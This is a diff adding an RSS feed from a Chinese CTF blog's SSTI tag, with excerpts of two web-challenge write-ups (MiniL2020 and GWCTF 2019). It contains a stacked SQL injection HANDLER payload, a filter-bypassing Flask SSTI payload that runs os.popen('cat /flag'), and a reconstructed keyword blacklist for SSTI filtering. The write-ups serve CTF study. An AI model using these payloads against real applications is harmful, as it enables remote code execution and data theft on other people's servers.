@@ -1,0 +1,58 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>SSTI on wh1sper</title>
+    <link>https://anthem-whisper.github.io/tags/ssti/</link>
+    <description>Recent content in SSTI on wh1sper</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 10 May 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/tags/ssti/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>MiniL2020_web_wp</title>
+      <link>https://anthem-whisper.github.io/p/minil2020_web_wp/</link>
+      <pubDate>Sun, 10 May 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/minil2020_web_wp/</guid>
+      <description>西电校赛，难度适中，本人内鬼选手，看了下题。
+ id_wife 考点：堆叠注入
+不是很难，最开始没想到堆叠，跑去盲注，差点怀疑人生
+测出来堆叠之后就简单了，其他过滤什么我不知道，直接参考新春战疫的一道sqli，Handler一把梭
+frank&#39;);handler `1145141919810` open;handler `1145141919810` read first;handler `1145141919810` read next;#minil{4cc5cda6-30c6-48ff-ab4e-9c2830005191}
+Personal_IP_Query 考察：flaskSSTI，绕过下划线、单双引号。
+学习链接
+&amp;gt;&amp;gt;flag0师傅
+&amp;gt;&amp;gt;byc_404师傅
+打开题目，显示Your Ip IS……马上想到XFF头，伪造之后发现输入的XFF头显示出来了，然后踌躇了一阵子，回头看响应包，响应头里面有一个SERVER提示这个是python的后端，那么就尝试SSTI
+输入 {{2+2}} 之后回显的 4 实锤。
+Fuzz，过滤了下划线、单双引号、没有过滤中括号
+最开始我用的是[request.value.class]那个，后来试了半天不能绕过中括号里还有引号的，后来队友改用attr(request.args.class)秒出
+在class中寻找模块exp：
+#python 3import restr = &#39;&#39;&#39;（回显信息）&#39;&#39;&#39;list = re.split(&#39;,&#39;, str)for i in range(0, len(list)):if &#39;catch_warnings&#39; in list[i]:print(i)breakplayload：
+?x1=__class__&amp;amp;x2=__base__&amp;amp;x3=__subclasses__&amp;amp;x4=__getitem__&amp;amp;x5=__init__&amp;amp;x6=__globals__&amp;amp;x7=__builtins__&amp;amp;x8=eval&amp;amp;x9=__import__(&amp;quot;os&amp;quot;).popen(&#39;cat+/flag&#39;).read()X-Forwarded-For:{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(174)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)}}复现时补充：
+我的原来那个中括号的做法时走得通的，然后os模块也可以的，只是当时可能由于某些玄学原因没成功，这里补上：
+XFF：{{ [][request.args.class][request.args.mro][1][request.args.subclasses]()[127] }}//回显：Your IP: &amp;lt;class &#39;os.</description>
+    </item>
+    
+    <item>
+      <title>GWCTF 2019 复现</title>
+      <link>https://anthem-whisper.github.io/p/gwctf-2019-%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Thu, 30 Apr 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/gwctf-2019-%E5%A4%8D%E7%8E%B0/</guid>
+      <description>之前广外CTF的时候才刚刚接触CTF，当时只做了一道随机数爆破，现在来复现
+ 你的名字 考点：flaskSSTI、绕过{{}}过滤、黑名单过滤逻辑错误
+很详细的SSTI&amp;raquo;：https://xz.aliyun.com/t/6885#toc-4
+SSTIbypass姿势&amp;raquo;https://p0sec.net/index.php/archives/120/
+参考：&amp;raquo;ggb0n
+打开题目，只有一个输入框，联想到注入，不过SQLi尝试之后发现并不行，于是就去尝试SSTI，不过网上的wp说可以通过抓包查看响应头来判断服务器使用的python的模板。
+尝试输入{{2*2}}，返回“Parse error: syntax error, unexpected T_STRING, expecting &amp;lsquo;{&amp;rsquo; in \var\WWW\html\test.php on line 13 ”
+不管怎么改，返回的结果都是一样的，说明可能{{}}被过滤了；
+但是可以通过 {%%} 类似的方式来进行注入，尝试 {%if 1%}1{% endif%} ，发现服务器直接给出500错误。。。判断可能有什么过滤
+直接输入if，返回结果是：
+hello !说明if被替换为空了，尝试双写iiff，但是还是被替换为空了，可能是用的循环匹配。
+参考了师傅写的wp，fuzz出来的过滤可能是这个样子：
+blacklist = [&#39;import&#39;, &#39;getattr&#39;, &#39;os&#39;, &#39;class&#39;, &#39;subclasses&#39;, &#39;mro&#39;, &#39;request&#39;, &#39;args&#39;, &#39;eval&#39;,&#39;if&#39;, &#39;for&#39;,&#39; subprocess&#39;, &#39;file&#39;, &#39;open&#39;, &#39;popen&#39;, &#39;builtins&#39;, &#39;compile&#39;,&#39;execfile&#39;, &#39;from_pyfile&#39;, &#39;local&#39;,&#39;self&#39;, &#39;item&#39;, &#39;getitem&#39;, &#39;getattribute&#39;, &#39;func_globals&#39;, &#39;config&#39;]for no in blacklist:while True:if no in s:s = s.</description>
+    </item>
+    
+  </channel>
+</rss>
